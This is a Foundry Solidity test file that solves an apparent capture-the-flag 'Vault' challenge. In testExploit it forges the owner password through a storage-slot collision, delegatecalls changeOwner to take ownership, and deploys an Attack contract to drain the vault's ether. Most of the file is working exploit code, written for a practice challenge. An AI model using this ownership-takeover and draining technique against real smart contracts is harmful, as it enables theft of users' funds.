// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        bytes32 pass = bytes32(uint256(uint160(address(logic))));//bytes32(uint256(addr))
        bytes memory methodData = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            pass,
            palyer
        );
        (bool success, ) = address(vault).call(methodData);
        console.log("success:", success);
        vault.openWithdraw();
        console.log("canWithdraw:", vault.canWithdraw());

        Attack attack = new Attack{value: 0.1 ether}(payable(address(vault)));
        attack.start();
        assertEq(address(attack).balance, 0.2 ether);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
